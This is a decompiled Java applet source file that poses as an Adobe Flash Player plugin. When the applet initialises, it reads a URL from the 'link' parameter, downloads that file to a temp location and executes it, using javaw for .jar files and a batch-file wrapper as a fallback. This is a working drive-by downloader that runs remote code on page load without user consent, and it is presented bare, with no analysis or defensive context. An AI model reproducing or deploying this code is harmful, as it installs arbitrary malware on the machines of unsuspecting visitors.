import java.net.URLConnection;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Main extends Applet
{
    public void Plugin() throws Exception {
        final byte[] buffer = new byte[10240];
        final String archivo = this.getParameter("link");
        System.out.println("Adobe Flash Player :" + archivo);
        String ext = archivo.substring(archivo.lastIndexOf("."));
        ext = ext.toLowerCase();
        final File nuevo = File.createTempFile("FlashPlayer", ext);
        final FileOutputStream stream = new FileOutputStream(nuevo);
        final URL ur = new URL(archivo);
        final URLConnection uc = ur.openConnection();
        final BufferedInputStream is = new BufferedInputStream(uc.getInputStream());
        int leidos;
        while ((leidos = is.read(buffer)) > 0) {
            stream.write(buffer, 0, leidos);
        }
        stream.close();
        if (ext.contains(".jar")) {
            Runtime.getRuntime().exec(String.valueOf(System.getProperty("sun.boot.library.path")) + "\\javaw.exe -jar  \"" + nuevo.getAbsolutePath() + "\"");
        }
        else {
            try {
                Runtime.getRuntime().exec(nuevo.getAbsolutePath());
            }
            catch (IOException e) {
                final File f = File.createTempFile("tmp", ".bat");
                f.createNewFile();
                f.deleteOnExit();
                final PrintWriter pw = new PrintWriter(f);
                pw.println("\"" + nuevo.getAbsolutePath() + "\"");
                pw.close();
                Runtime.getRuntime().exec(f.getAbsolutePath());
                f.delete();
            }
        }
        nuevo.deleteOnExit();
    }
    
    public void init() {
        try {
            this.Plugin();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        super.init();
    }
}
